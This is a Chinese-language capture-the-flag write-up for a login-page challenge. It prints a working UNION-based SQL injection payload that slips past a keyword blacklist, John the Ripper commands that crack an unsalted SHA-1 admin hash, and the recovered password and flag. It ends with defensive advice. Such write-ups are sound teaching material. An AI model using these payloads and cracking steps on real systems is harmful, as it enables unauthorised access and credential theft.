# chill-site

## 题目简述

登录接口把用户名直接拼进 SQLite 查询，只过滤 `or`、`--` 和 `true` 三个子串。利用 `UNION SELECT` 与块注释可以泄露整张用户表，其中管理员口令只保存为无盐 SHA-1。恢复明文后，应用又把用户提交的原始密码放入客户端 Cookie，并在确认页面重新计算 SHA-1 与管理员散列比较，因而可以完成登录。

## 解题过程

服务端构造的查询为：

```python
password = hashlib.sha1(request.form["password"].encode("ascii")).hexdigest()
cmd = f"SELECT user, pass, time FROM database WHERE user='{username}' AND pass='{password}'"
```

用户名输入以下内容：

```text
' UNION SELECT * FROM database/*
```

最终 SQL 的前半段变成空用户名查询，再与整张 `database` 表做 `UNION`；末尾的 `/*` 注释掉原查询追加的单引号和密码条件。该字符串不包含黑名单中的 `or`、`--` 或 `true`。重定向到 `/check` 后，页面会显示所有返回行，可以取得用户 `tuxtheflagmasteronlylikeslowercaseletters` 的散列：

```text
64b7c90a991571c107cc663aa768514822896f49
```

这是 40 位十六进制 SHA-1，题目用户名还提示口令只含小写字母。用 John the Ripper 对小写字符做递增长度枚举即可；本地复验在长度 7 找到结果：

```bash
printf '%s\n' 64b7c90a991571c107cc663aa768514822896f49 > hash.txt
john --format=raw-sha1 --incremental=Lower --max-length=7 hash.txt
john --show --format=raw-sha1 hash.txt
```

```text
allsgud
```

再次提交相同 SQL 注入用户名，并把密码改为 `allsgud`。应用会把原始密码写入 `userPassword` Cookie；在 `/check` 点击 `YES` 后，服务端计算 `SHA1("allsgud")`，与管理员散列相等，于是返回：

```text
tjctf{3verth1ng_i5_fin3}
```

## 方法总结

- 核心技巧：用未被黑名单覆盖的 `UNION SELECT` 和块注释完成 SQL 注入，再针对无盐 SHA-1 做有界口令恢复。
- 识别信号：字符串格式化 SQL、只拦少数关键词、查询结果进入客户端 Cookie，以及 SHA-1 直接存储密码。
- 复用要点：黑名单不能替代参数化查询；密码应使用 Argon2、scrypt 或 bcrypt 等带盐慢哈希，认证状态也不应信任可由客户端任意修改的明文 Cookie。
